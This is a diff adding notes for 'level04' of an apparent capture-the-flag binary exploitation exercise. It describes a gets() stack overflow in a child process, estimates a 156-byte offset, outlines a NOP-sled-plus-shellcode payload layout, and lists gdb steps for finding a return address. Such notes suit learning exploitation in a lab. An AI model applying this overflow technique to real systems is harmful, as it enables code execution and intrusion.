@@ -1,4 +1,48 @@
 # level04 notes:
+# Problem:
+The child process executes:
+
+char buf[128];
+gets(buf);
+
+This gives:
+    a 128‑byte buffer
+    no bounds checking
+    ability to overwrite saved EIP
+    ability to redirect execution to your shellcode
+
+# OFFSET calculation:
+buf[128]
+saved EBP (4 bytes)
+saved EIP (4 bytes)
++ compiler alignment / stack frame padding (20 bytes)
+-----------------------------------------------
+≈ 128 + 4 + 4 + ~20 = 156 bytes
+
+# payload = b"\x90" * 24:
+[ 24 bytes of NOPs ]
+[ shellcode ]
+[ padding ]
+[ RET_ADDR ]
+
+# RET_ADDR 
+gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) disassemble main
+(gdb) break *<instruction_after_call_to_gets> (*0x08048763)
+(gdb) run
+(gdb) info registers
+(gdb) x/64bx $esp
+
+At this point:
+    $esp is the start of the buffer used by gets
+    the address you see (e.g. 0xffffd680) is where your payload will land
+    you choose:
+RET_ADDR = ESP + 0x20
+Example:
+    esp = 0xffffd680
+    RET_ADDR = 0xffffd680 + 0x20 = 0xffffd6a0
+
 1. Copy level04 binary file to host machine
 scp -P 4242 level04@192.168.122.1:/home/users/level04/level04 ./Lien-Override/BinaryfromISO/level04
 
